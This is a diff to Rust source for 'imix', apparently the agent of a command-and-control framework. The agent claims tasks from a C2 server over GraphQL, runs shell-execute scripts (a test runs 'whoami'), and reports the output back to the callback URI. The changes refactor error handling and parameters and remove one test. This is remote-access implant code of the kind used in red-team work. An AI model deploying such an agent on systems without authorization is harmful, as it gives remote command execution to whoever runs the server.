@@ -28,11 +28,12 @@ async fn install(config_path: String) -> Result<(), imix::Error> {
 }
 
 async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
+    // Download auxillary files from CDN
 
     // Read a tome script
     let task_job = match task.job {
         Some(job) => job,
-        None => todo!(),
+        None => return Ok(("".to_string(), format!("No job associated for task ID: {}", task.id))),
     };
 
     let tome_name = task_job.tome.name;
@@ -46,7 +47,7 @@ async fn handle_exec_tome(task: GraphQLTask) -> Result<(String,String)> {
     }
 }
 
-async fn handle_exec_timeout_and_response(imix_config: imix::Config, task: graphql::GraphQLTask) -> Result<(), Error> {
+async fn handle_exec_timeout_and_response(imix_callback_uri: String, task: graphql::GraphQLTask) -> Result<(), Error> {
     let start_time = Utc::now();
 
     // Tasks will be forcebly stopped after 1 week.
@@ -60,7 +61,7 @@ async fn handle_exec_timeout_and_response(imix_config: imix::Config, task: graph
         Ok(res) => {
             match res {
                 Ok(tome_result) => tome_result,
-                Err(tome_error) => return Err(tome_error),
+                Err(tome_error) => ("".to_string(), tome_error.to_string()),
             }
         },
         // If our timeout timer has expired set the port state to timeout and return.
@@ -78,8 +79,7 @@ async fn handle_exec_timeout_and_response(imix_config: imix::Config, task: graph
         error: tome_output.1.clone(),
     };
 
-    let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
-    let submit_task_result = graphql::gql_post_task_result(cur_callback_uri, test_task_response).await;
+    let submit_task_result = graphql::gql_post_task_result(imix_callback_uri, test_task_response).await;
     match submit_task_result {
         Ok(_) => Ok(()), // Currently no reason to save the task since it's the task we just answered.
         Err(error) => Err(error),
@@ -105,7 +105,7 @@ async fn main_loop(config_path: String) -> Result<()> {
         let cur_callback_uri = imix_config.callback_config.c2_configs[0].uri.clone();
 
         // 1b) Collect new tasks
-        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri).await {
+        let new_tasks = match graphql::gql_claim_tasks(cur_callback_uri.clone()).await {
             Ok(tasks) => tasks,
             Err(error) => {
                 if debug {
@@ -117,7 +117,7 @@ async fn main_loop(config_path: String) -> Result<()> {
 
         // 2. Start new tasks
         for task in new_tasks {
-            let exec_with_timeout = handle_exec_timeout_and_response(imix_config.clone(), task.clone());
+            let exec_with_timeout = handle_exec_timeout_and_response(cur_callback_uri.clone(), task.clone());
             match all_exec_futures.insert(task.clone().id, task::spawn(exec_with_timeout)) {
                 Some(_old_task) => {
                     if debug {
@@ -137,6 +137,7 @@ async fn main_loop(config_path: String) -> Result<()> {
         // Check status
         for exec_future in all_exec_futures.iter() {
             println!("{}: {:?}", exec_future.0, exec_future.1.is_finished());
+            // TODO: Dequeue finished tasks.
         }
     }
 }
@@ -202,12 +203,12 @@ mod tests {
     #[test]
     fn imix_handle_exec_tome() {
         let test_tome_input = GraphQLTask{
-            id: "e05463e0-d30f-4bdd-8d64-7b341896c6a4".to_string(),
+            id: "17179869185".to_string(),
             job: Some(GraphQLJob {
-                id: "cc0704c5-6773-4be3-b952-4cfa5c3eb2c4".to_string(),
+                id: "4294967297".to_string(),
                 name: "Test Exec".to_string(),
                 tome: GraphQLTome {
-                    id: "b41b554b-a67a-4c74-bcdc-bb5b80154061".to_string(),
+                    id: "21474836482".to_string(),
                     name: "Shell execute".to_string(),
                     description: "Execute a command in the default system shell".to_string(),
                     parameters: None,
@@ -246,76 +247,4 @@ mod tests {
         assert_eq!(bool_res, true);
 
     }
-
-
-
-    #[test]
-    fn imix_handle_exec_timeout_and_respones() {
-
-        // Define test task
-        let test_tome_input = GraphQLTask{
-            id: "e05463e0-d30f-4bdd-8d64-7b341896c6a4".to_string(),
-            job: Some(GraphQLJob {
-                id: "cc0704c5-6773-4be3-b952-4cfa5c3eb2c4".to_string(),
-                name: "Test Exec".to_string(),
-                tome: GraphQLTome {
-                    id: "b41b554b-a67a-4c74-bcdc-bb5b80154061".to_string(),
-                    name: "Shell execute".to_string(),
-                    description: "Execute a command in the default system shell".to_string(),
-                    parameters: None,
-                    eldritch: r#"sys.shell("whoami")"#.to_string(),
-                    files: [].to_vec(),
-                },
-                bundle: None,
-            }),
-        };
-
-        // Define expected task output
-        let expected_task_result = graphql::GraphQLSubmitTaskResultInput {
-            task_id: test_tome_input.clone().id,
-            exec_started_at: Utc::now(),
-            exec_finished_at: None,
-            output: "root\n".to_string(),
-            error: "".to_string(),
-        };
-
-        // Define http server with expected JSON.
-        let server = Server::run();
-        server.expect(
-            Expectation::matching(
-                request::body(serde_json::to_string(&expected_task_result).unwrap())
-            )
-            .respond_with(status_code(200))
-        );
-
-        // Define test imix config
-        let imix_config: imix::Config = imix::Config {
-            target_name: "test1234".to_string(),
-            target_forward_connect_ip: "127.0.0.1".to_string(),
-            callback_config: CallbackConfig {
-                interval: 3,
-                jitter: 0,
-                timeout: 5,
-                c2_configs: [
-                    C2Config {
-                        uri: server.url("/graphql").to_string(),
-                        priority: 0,
-                    }
-                ].to_vec(),
-            },
-            service_configs: [].to_vec(),
-        };
-
-        // Run our function
-        let runtime = tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-        .unwrap();
-
-        let task_future =  runtime.block_on(
-            handle_exec_timeout_and_response(imix_config, test_tome_input)
-        ).unwrap();
-
-    }
-
 }
